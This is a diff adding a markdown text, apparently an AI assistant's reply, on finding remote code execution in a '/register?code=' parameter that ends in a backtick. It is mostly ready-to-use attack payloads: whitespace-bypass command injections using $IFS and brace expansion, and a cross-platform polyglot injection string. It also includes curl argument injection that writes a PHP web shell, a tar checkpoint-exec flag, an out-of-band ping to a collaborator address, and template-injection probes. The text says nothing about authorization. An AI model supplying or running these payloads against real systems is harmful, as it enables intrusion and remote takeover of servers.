@@ -1,0 +1,56 @@
+To find an RCE that 99% of researchers miss on an endpoint like /register?code=YOURCODE%60, you have to look beyond standard automated tools and obvious backtick payloads. The trailing %60 (a backtick `) strongly implies the backend might be failing to sanitize command execution contexts or is breaking a custom parser.
+Elite bug bounty hunters look for edge cases where the vulnerability is heavily masked by firewalls, encodings, or atypical backend architectures.
+------------------------------
+## 1. Multi-Byte & Alternative Whitespace Bypasses
+Many Web Application Firewalls (WAFs) and custom filters scan strictly for regular spaces (%20 or +) between a command and its arguments (e.g., sleep 10). If a filter blocks spaces, automated tools fail.
+
+* The Technique: Substitute spaces with internal shell variables or alternative whitespace characters that bash or sh still parse perfectly.
+* Alternative Separators:
+* $IFS (Internal Field Separator): YOURCODE%60;sleep$IFS$910;%60
+   * Brace Expansion: YOURCODE%60;{sleep,10};%60
+   * Redirection Shorthand: YOURCODE%60;sleep<10;%60
+   * Hex Whitespace: Test alternative control characters like Vertical Tab (%0b), Form Feed (%0c), or Carriage Return (%0d).
+
+## 2. Blind Polyglot Payload Injections
+Standard payloads break when a researcher guesses the wrong syntax container (e.g., trying to escape single quotes when the backend uses double quotes, or executing Unix commands on a Windows server).
+
+* The Technique: Inject an aggressive "polyglot" payload designed to escape almost any string container (quotes, backticks, parentheses, braces) and execute a command regardless of whether the operating system is Windows or Linux.
+* The Payload:
+
+YOURCODE%60;%0Atimeout+/t+10%0Asleep+10%0A`'test"|sleep+10|id&sleep+10&
+
+* Why it works: It mixes %0A (newlines), backticks, single/double quotes, and both sleep (Linux) and timeout (Windows). No matter how the backend wraps your input inside the shell command, one of these sequences will likely break out and fire.
+
+## 3. Argument Injection via CLI Flags
+Sometimes your input isn't being passed straight into a shell execution function (like system()), but is instead passed as a safe array argument into a specific system binary (e.g., git, curl, ssh, or a local registration tool). Standard command separators like ; or && will completely fail here because no shell is interpreting them.
+
+* The Technique: Hijack the flags of the underlying command being run.
+* Example (If backend uses curl or a downloader internally):
+* YOURCODE -o /var/www/html/shell.php -d "<?php system($_GET['cmd']); ?>"
+* Example (If backend uses tar or archive tools internally):
+* YOURCODE --checkpoint=1 --checkpoint-action=exec=whoami
+* Why it works: The application treats the input as a single argument string rather than a new command, but the binary itself interprets your malicious flags to perform unexpected actions or file writes.
+
+## 4. Bypassing Asynchronous and Stateless Environments (OOB)
+In modern high-performance registration forms, your input is often placed into a background queue (like RabbitMQ, Celery, or AWS SQS) and processed minutes later by a completely separate, isolated worker server.
+
+* The Technique: Traditional time-based testing (sleep 10) will fail because the HTTP response returns "Success" instantly while your code runs asynchronously on a worker node. You must rely on Out-of-Band (OOB) interactions that don't depend on DNS (which is often locked down or monitored).
+* Deep OOB Channels:
+* ICMP (Ping): YOURCODE%60;ping -c 3 your-collaborator-ip;%60
+   * Alternative Ports: Firewalls often block outbound traffic on port 80/443, but forget about NTP (Port 123) or LDAP (Port 389). Try triggering connections on uncommon outbound channels.
+
+## 5. Server-Side Template Injection (SSTI) Leading to RCE
+If the registration code parameter handles dynamic rendering or generates a custom confirmation email/page, the injection might not be in an OS command line, but inside a template engine (like Jinja2, Twig, or Blade). Most researchers stop when command characters don't respond.
+
+* The Technique: Test if the backtick is causing a syntax error in an underlying template compiler rather than a shell script.
+* The Payloads:
+* YOURCODE{{7*7}}
+   * YOURCODE${7*7}
+* Why it works: If the application outputs YOURCODE49 anywhere on the screen or in an email, you have SSTI. From there, you can navigate the language environment objects (e.g., MRO in Python) to call execution classes and gain full RCE.
+
+------------------------------
+To apply these advanced methods effectively, do you know:
+
+* Does the page return a generic error when you use the backtick, or does it process normally?
+* Have you observed any differences in response times when trying different characters?
+
